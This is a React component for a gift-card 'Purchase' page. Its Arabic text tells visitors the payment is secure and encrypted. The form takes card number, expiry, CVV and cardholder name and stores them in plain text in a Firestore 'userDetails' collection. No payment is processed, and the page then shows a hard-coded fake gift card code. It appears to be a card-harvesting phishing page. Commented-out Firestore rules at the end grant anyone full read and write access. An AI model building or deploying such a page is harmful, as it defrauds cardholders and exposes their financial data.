import React from "react";
import { useState } from "react";
import { db } from "./firebase";
import Header from "./Header";
import "./Purchase.css";

const Purchase = () => {
  // const saveData = (event) => {
  //   event.preventDefault();

  //   const elementsArray = [...event.target.elements];

  //   console.log(elementsArray);

  //   const formData = elementsArray.reduce((accumulator, currentValue) => {
  //     if (currentValue.id) {
  //       accumulator[currentValue.id] = currentValue.value;
  //     }
  //     return accumulator;
  //   }, {});

  //   db.collection("UserInformation").add(formData);
  //   // console.log({ formData });
  // };

  const [cardnumber, setCardnumber] = useState("");
  const [carddate, setCarddate] = useState("");
  const [cardcw, setCardcw] = useState("");
  const [cardname, setCardname] = useState("");

  const sub = (e) => {
    e.preventDefault();

    db.collection("userDetails")
      .add({
        cardname: cardname,
        cardcw: cardcw,
        carddate: carddate,
        cardnumber: cardnumber,
      })
      .then((docRef) => {
        alert(
          "You Have succefully purchase a giftcard, Your giftcard code is   X4TV6XJFL6WYHLY5"
        );
      })
      .catch((error) => {
        console.error("Error adding document: ", error);
      });
  };

  return (
    <div>
      <Header />

      <div className="payment__image">
        <img
          src="https://i.pinimg.com/564x/2a/63/e4/2a63e48fe716f0e448a6815ae6dd5b32.jpg"
          alt=""
        />
        <img
          src="https://i.pinimg.com/236x/07/73/4c/07734cf160091516ce46a0e71b9f1cab.jpg"
          alt=""
        />
        <img
          src="https://i.pinimg.com/236x/47/4a/0d/474a0d162f7aed91e291d2aa91d851be.jpg"
          alt=""
        />
      </div>
      <h1>هذه طريقة دفع مشفرة آمنة. انت محمي</h1>
      <h2>بطاقة الائتمان والخصم</h2>
      <br />
      <form
        onSubmit={(event) => {
          sub(event);
        }}
      >
        <input
          type="number"
          placeholder="رقم البطاقة"
          onChange={(e) => {
            setCardnumber(e.target.value);
          }}
        />

        <input
          type="date"
          placeholder="تاريخ انتهاء الصلاحية"
          onChange={(e) => {
            setCarddate(e.target.value);
          }}
        />
        <input
          type="number"
          className="Cw"
          placeholder="CW"
          onChange={(e) => {
            setCardcw(e.target.value);
          }}
        />
        <input
          type="text"
          placeholder="اسم حامل البطاقة"
          onChange={(e) => {
            setCardname(e.target.value);
          }}
        />
        <button className="button" type="submit">
          ادفع الآن
        </button>
      </form>
    </div>
  );
};

export default Purchase;

// rules_version = '2';
// service cloud.firestore {
//   match /databases/{database}/documents {
// service cloud.firestore {
//   match /databases/{database}/documents {
//     match /<some_path>/ {
//       allow read, write: if <some_condition>;
//     }
//   }
// }

// Allow read/write access to all users under any conditions
// Warning: **NEVER** use this rule set in production; it allows
// anyone to overwrite your entire database.
// service cloud.firestore {
//   match /databases/{database}/documents {
//     match /{document=**} {
//       allow read, write: if true;
//     }
//   }
// }
